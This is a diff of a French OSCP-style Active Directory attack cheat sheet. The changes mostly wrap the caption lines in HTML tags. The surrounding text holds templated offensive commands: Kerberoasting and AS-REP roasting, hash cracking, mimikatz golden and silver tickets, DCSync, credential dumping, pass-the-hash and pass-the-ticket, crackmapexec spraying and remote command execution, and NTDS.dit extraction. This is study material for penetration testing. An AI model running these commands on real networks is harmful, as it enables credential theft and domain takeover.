@@ -11,21 +11,21 @@ description: "Étudier les mécanismes d'authentification et les techniques AD."
 ## AS-REP Roasting
 
 
-Analyser une empreinte avec le mode indiqué.
+<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>
 
 ```bash
 John the Ripper
 ```
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePreAuth
 ```
 
 
-Commande `rubeus.exe` pour la rubrique « AS-REP Roasting ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil rubeus.exe.</p>
 
 ```powershell
 Rubeus.exe asreproast
@@ -35,7 +35,7 @@ Rubeus.exe asreproast /nowrap
 ```
 
 
-Commande `impacket-getnpusers` pour la rubrique « AS-REP Roasting ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-getnpusers.</p>
 
 ```bash
 # From Kali (GetNPUsers.py)
@@ -46,7 +46,7 @@ GetNPUsers.py domain/[user]:[password]@[dc-ip] -no-pass
 ```
 
 
-Analyser une empreinte avec le mode indiqué.
+<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>
 
 ```bash
 hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt
@@ -56,14 +56,14 @@ hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt
 ## Kerberoasting
 
 
-Commande `getuserspns.py` pour la rubrique « Kerberoasting ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil getuserspns.py.</p>
 
 ```powershell
 GetUserSPNs.py domain/[user]:[password]@[dc-ip]
 ```
 
 
-Commande `impacket-getuserspns` pour la rubrique « Kerberoasting ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-getuserspns.</p>
 
 ```bash
 # From Kali
@@ -76,7 +76,7 @@ GetUserSPNs.py domain/[user]:[password]@[dc-ip] -request
 ```
 
 
-Commande `rubeus.exe` pour la rubrique « Kerberoasting ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil rubeus.exe.</p>
 
 ```powershell
 Rubeus.exe kerberoast
@@ -85,7 +85,7 @@ Rubeus.exe kerberoast /outfile:[output_file].kerberoast
 ```
 
 
-Analyser une empreinte avec le mode indiqué.
+<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>
 
 ```bash
 hashcat -m 13100 [kerberoast_hashes_file].txt /usr/share/wordlists/rockyou.txt
@@ -95,7 +95,7 @@ hashcat -m 13100 [kerberoast_hashes_file].txt /usr/share/wordlists/rockyou.txt
 ## Tickets Silver
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 # 1. Find the [ServiceAccountName]
@@ -111,7 +111,7 @@ mimikatz # lsadump::dcsync /user:HTTP/server01
 ```
 
 
-Exemple technique pour la rubrique « Tickets Silver ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Tickets Silver ».</p>
 
 ```powershell
 # 1. Find the Domain SID
@@ -132,7 +132,7 @@ mimikatz # kerberos::golden /sid:S-1-5-21-1863423273-656352785-1243762498 /domai
 ```
 
 
-Commande `mimikatz` pour la rubrique « Tickets Silver ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
 
 ```powershell
 mimikatz # kerberos::ptt silver_ticket.kirbi
@@ -142,7 +142,7 @@ klist
 ```
 
 
-Commande `dir` pour la rubrique « Tickets Silver ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dir.</p>
 
 ```bash
 dir \\targetserver\sharedfolder
@@ -156,14 +156,14 @@ dir \\targetserver\sharedfolder
 `Mimikatz`  
 
 
-Commande `mimikatz` pour la rubrique « Tickets Golden ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
 
 ```powershell
 mimikatz # lsadump::dcsync /domain:[domain.com] /user:krbtgt
 ```
 
 
-Exemple technique pour la rubrique « Tickets Golden ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Tickets Golden ».</p>
 
 ```powershell
 # 1. Find the Domain SID
@@ -181,7 +181,7 @@ mimikatz # kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domai
 ```
 
 
-Commande `mimikatz` pour la rubrique « Tickets Golden ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
 
 ```powershell
 mimikatz # kerberos::ptt golden_ticket.kirbi
@@ -191,7 +191,7 @@ klist
 ```
 
 
-Commande `net` pour la rubrique « Tickets Golden ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil net.</p>
 
 ```bash
 net use \\domaincontroller\C$ /user:[DesiredUsername]
@@ -203,14 +203,14 @@ net use \\domaincontroller\C$ /user:[DesiredUsername]
 Examiner les objets, les droits et les services du domaine.
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-ADGroupMember -Identity "Domain Admins"
 ```
 
 
-Commande `impacket-secretsdump` pour la rubrique « Domain Controller Synchronization (DC Sync) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-secretsdump.</p>
 
 ```powershell
 # From Kali
@@ -225,14 +225,12 @@ mimikatz # lsadump::dcsync /domain:[domain.com] /user:[targetUser]
 ```
 
 
-Commande `mimikatz` pour la rubrique « Domain Controller Synchronization (DC Sync) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
 
 ```powershell
 mimikatz # lsadump::dcsync /domain:[domain.com]
 ```
 
-
-Commande `mimikatz` pour la rubrique « Domain Controller Synchronization (DC Sync) ».
 
 ```powershell
 # You can redirect output to a file for analysis:
@@ -240,7 +238,7 @@ mimikatz # lsadump::dcsync /domain:domain.com > output.txt
 ```
 
 
-Analyser une empreinte avec le mode indiqué.
+<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>
 
 ```bash
 hashcat -m 1000 [hashes_file].txt /usr/share/wordlists/rockyou.txt
@@ -252,7 +250,7 @@ hashcat -m 1000 [hashes_file].txt /usr/share/wordlists/rockyou.txt
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-Commande `mimikatz` pour la rubrique « Identifiants AD en cache ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
 
 ```powershell
 mimikatz # privilege::debug
@@ -277,7 +275,7 @@ mimikatz # lsadump::cache
 ```
 
 
-Analyser une empreinte avec le mode indiqué.
+<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>
 
 ```bash
 hashcat -m 1000 [cached_hash].txt /usr/share/wordlists/rockyou.txt
@@ -289,21 +287,19 @@ hashcat -m 1000 [cached_hash].txt /usr/share/wordlists/rockyou.txt
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ntlm_authentication.png)
 
 
-Commande `mimikatz` pour la rubrique « Authentification NTLM ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
 
 ```powershell
 mimikatz # sekurlsa::logonpasswords
 ```
 
 
-Commande `mimikatz` pour la rubrique « Authentification NTLM ».
-
 ```powershell
 mimikatz # sekurlsa::pth /user:[username] /domain:[domain.com] /ntlm:[NTLMhash]
 ```
 
 
-Commande `dir` pour la rubrique « Authentification NTLM ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dir.</p>
 
 ```bash
 dir \\targetserver\sharedfolder
@@ -317,21 +313,19 @@ Examiner les objets, les droits et les services du domaine.
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/kerberos_authentication.jpg)
 
 
-Commande `mimikatz` pour la rubrique « Authentification Kerberos ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
 
 ```powershell
 mimikatz # sekurlsa::tickets /export
 ```
 
 
-Commande `mimikatz` pour la rubrique « Authentification Kerberos ».
-
 ```powershell
 mimikatz # kerberos::ptt TGT_ticket.kirbi
 ```
 
 
-Commande `dir` pour la rubrique « Authentification Kerberos ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dir.</p>
 
 ```bash
 dir \\targetserver\sharedfolder
@@ -341,7 +335,7 @@ dir \\targetserver\sharedfolder
 #### Exécuter le script
 
 
-Commande `.` pour la rubrique « Exécuter le script ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
 
 ```powershell
 # -Pass allow us to use a single password to test.
@@ -354,7 +348,7 @@ Commande `.` pour la rubrique « Exécuter le script ».
 #### Code source of the Script
 
 
-Exemple technique pour la rubrique « Code source of the Script ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Code source of the Script ».</p>
 
 ```powershell
 <#
@@ -779,7 +773,7 @@ BruteForce $duration $threshold $passwords
 `System.DirectoryServices`  
 
 
-Exemple technique pour la rubrique « Authenticating using DirectoryEntry ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Authenticating using DirectoryEntry ».</p>
 
 ```powershell
 # Fetch the current domain object
@@ -804,7 +798,7 @@ $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath, 
 #### Commandes de base
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --continue-on-success
@@ -815,14 +809,10 @@ crackmapexec smb [ip/domain] -u [userName] -p '[password]' -d [domain.com]
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
-
 ```bash
 crackmapexec smb [ip/domain] -u [userName] -p '[password]' -d [domain.com] --kerberos
 ```
 
-
-Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --signing
@@ -833,7 +823,7 @@ crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 `--continue-on-error`  
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --continue-on-error
@@ -843,35 +833,27 @@ crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 #### Commandes complémentaires
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --shares
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
-
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --smbv1
 ```
 
-
-Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --sessions
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
-
 ```bash
 crackmapexec smb [ip/domain] -u Administrator -p '[AdminPassword]!' -d [domain.com] --sam
 ```
 
-
-Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smb [ip/domain] -u [userName] -p '[password]!' -d [domain.com] --exec-command "[command]"
@@ -881,126 +863,92 @@ crackmapexec smb [ip/domain] -u [userName] -p '[password]!' -d [domain.com] --ex
 #### Possible Services to Test
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
-
 ```bash
 crackmapexec rdp [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
-
-Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec winrm [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
-
 ```bash
 crackmapexec http [ip/domain] -u [userName] -p '[password]'
 ```
 
-
-Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec ftp [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
-
 ```bash
 crackmapexec telnet [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
-
-Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smtp [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
-
 ```bash
 crackmapexec dns [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
-
-Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec ldap [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
-
 ```bash
 crackmapexec netbios [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
-
-Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec mysql [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
-
 ```bash
 crackmapexec postgres [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
-
-Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec mssql [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
-
 ```bash
 crackmapexec oracle [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
-
-Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec redis [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
-
 ```bash
 crackmapexec docker [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
-
 ```bash
 crackmapexec snmp [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
-
-Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec ntp [ip/domain]
@@ -1010,7 +958,7 @@ crackmapexec ntp [ip/domain]
 ### Using kerbrute
 
 
-Commande `.` pour la rubrique « Using kerbrute ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
 
 ```powershell
 # The executable can be found in the kerbrute GitHub (link in Section 18.3.2.2).
@@ -1021,7 +969,7 @@ Commande `.` pour la rubrique « Using kerbrute ».
 ## Shadow Copies
 
 
-Commande `vshadow.exe` pour la rubrique « Shadow Copies ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil vshadow.exe.</p>
 
 ```powershell
 # -p X: this indicates which disk we wanto to copy, usually is C.
@@ -1033,7 +981,7 @@ vshadow.exe -nw -p C:
 `C:`  
 
 
-Commande `copy` pour la rubrique « Shadow Copies ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil copy.</p>
 
 ```powershell
 # Replace X with the shadow copy number, found in the previous command
@@ -1044,7 +992,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\nt
 ```
 
 
-Commande `reg.exe` pour la rubrique « Shadow Copies ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil reg.exe.</p>
 
 ```powershell
 reg.exe save hklm\system C:\backup_path\system.bak
@@ -1054,7 +1002,7 @@ C:\> reg.exe save hklm\system c:\system.bak
 ```
 
 
-Commande `impacket-secretsdump` pour la rubrique « Shadow Copies ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-secretsdump.</p>
 
 ```bash
 impacket-secretsdump -ntds [ntds_file] -system [system_file] LOCAL
@@ -1064,21 +1012,21 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
 
 
-Commande `mimikatz` pour la rubrique « Shadow Copies ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
 
 ```powershell
 mimikatz # lsadump::ntds /ntds:"[ntds_file]" /system:"[system_file]"
 ```
 
 
-Commande `vssadmin` pour la rubrique « Shadow Copies ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil vssadmin.</p>
 
 ```powershell
 vssadmin list shadows
 ```
 
 
-Commande `mklink` pour la rubrique « Shadow Copies ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mklink.</p>
 
 ```powershell
 # Replace X with the shadow copy number.
@@ -1086,14 +1034,14 @@ mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
 ```
 
 
-Commande `c` pour la rubrique « Shadow Copies ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
 
 ```text
 C:\ShadowCopy
 ```
 
 
-Commande `dir` pour la rubrique « Shadow Copies ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dir.</p>
 
 ```powershell
 dir C:\ShadowCopy
@@ -1103,21 +1051,19 @@ dir C:\ShadowCopy
 ## Constrained Delegation Attack
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-ADComputer -Filter {ServicePrincipalName -like "*"} -Property ServicePrincipalName | Select-Object Name,ServicePrincipalName
 ```
 
 
-Examiner les informations AD ou réseau en PowerShell.
-
 ```powershell
 Get-ADUser -Identity <ServiceAccount> -Properties msDS-AllowedToDelegateTo
 ```
 
 
-Commande `kinit` pour la rubrique « Constrained Delegation Attack ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil kinit.</p>
 
 ```bash
 kinit <ServiceAccount>
@@ -1141,7 +1087,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `nmap`  
 
 
-Identifier les versions des services.
+<p class="oscp-command-note">Identifier les versions des services.</p>
 
 ```bash
 nmap -p 88,135,139,389,445,5985,636,3268 -sC -sV -Pn [IP]
@@ -1205,7 +1151,7 @@ WinRM · Windows Remote Management.
 ### Complémentaire Énumération Techniques
 
 
-Commande `responder` pour la rubrique « Complémentaire Énumération Techniques ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil responder.</p>
 
 ```bash
 responder -I eth0
@@ -1216,7 +1162,7 @@ responder -I eth0
 `secretsdump.py`  
 
 
-Commande `secretsdump.py` pour la rubrique « Complémentaire Énumération Techniques ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil secretsdump.py.</p>
 
 ```bash
 # Same tool as impacket-secretsdump
@@ -1224,21 +1170,21 @@ secretsdump.py [domain].com/[VALID_USERNAME]:[VALID_PASSWORD]@[IP]
 ```
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-ADUser -Filter * | Select-Object Name, SamAccountName
 ```
 
 
-Commande `find-domainshare` pour la rubrique « Complémentaire Énumération Techniques ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil find-domainshare.</p>
 
 ```text
 Find-DomainShare -Writable
 ```
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-ADGroupMember -Identity "Domain Admins"
@@ -1252,7 +1198,7 @@ Get-ADGroupMember -Identity "Domain Admins"
 `CrackMapExec`  
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 crackmapexec smb [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --shares --rate 1
@@ -1268,21 +1214,21 @@ crackmapexec smb [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --shares --rate 1
 Examiner les objets, les droits et les services du domaine.
 
 
-Examiner le service avec les scripts NSE sélectionnés.
+<p class="oscp-command-note">Examiner le service avec les scripts NSE sélectionnés.</p>
 
 ```bash
 nmap -p 3389 --script rdp-ntlm-info [IP]
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 crackmapexec winrm [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --exec-method invoke_command
 ```
 
 
-Interroger les objets de l'annuaire LDAP.
+<p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>
 
 ```bash
 ldapsearch -x -h [IP] -p 9389
@@ -1292,7 +1238,7 @@ ldapsearch -x -h [IP] -p 9389
 ### Sample Outputs
 
 
-Commande `domain` pour la rubrique « Sample Outputs ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil domain.</p>
 
 ```text
 Domain Name: DOMAIN.LOCAL
@@ -1307,14 +1253,14 @@ Users:
 `CrackMapExec`  
 
 
-Commande `192.168.123.10` pour la rubrique « Sample Outputs ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil 192.168.123.10.</p>
 
 ```text
 192.168.123.10 - SMB         [*] domain.local\esolis:Password2024! (Pwned!)
 ```
 
 
-Commande `dn` pour la rubrique « Sample Outputs ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dn.</p>
 
 ```text
 dn: CN=Emma Solis,OU=Users,DC=domain,DC=local
@@ -1341,7 +1287,7 @@ Needed to access LSASS memory where Kerberos tickets are stored.
 Often sufficient, as it allows escalation to SYSTEM or LSASS access tools.
 
 
-Commande `mimikatz` pour la rubrique « Pass-the-Ticket (PtT) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
 
 ```powershell
 mimikatz
@@ -1350,7 +1296,7 @@ sekurlsa::tickets
 ```
 
 
-Commande `sekurlsa` pour la rubrique « Pass-the-Ticket (PtT) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil sekurlsa.</p>
 
 ```powershell
 # This will save .kirbi files to disk. Identify the correct TGT based on the user and encryption type.
@@ -1358,7 +1304,7 @@ sekurlsa::tickets /export
 ```
 
 
-Commande `kerberos` pour la rubrique « Pass-the-Ticket (PtT) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil kerberos.</p>
 
 ```powershell
 kerberos::ptt C:\path\to\admin_ticket.kirbi
@@ -1369,7 +1315,7 @@ kerberos::ptt C:\path\to\admin_ticket.kirbi
 `klist`  
 
 
-Commande `wmic` pour la rubrique « Pass-the-Ticket (PtT) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil wmic.</p>
 
 ```powershell
 # From Windows
@@ -1387,7 +1333,7 @@ Enter-PSSession -ComputerName [target_host] -Authentication Kerberos -Credential
 ```
 
 
-Commande `kirbi2ccache` pour la rubrique « Pass-the-Ticket (PtT) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil kirbi2ccache.</p>
 
 ```bash
 # From Kali
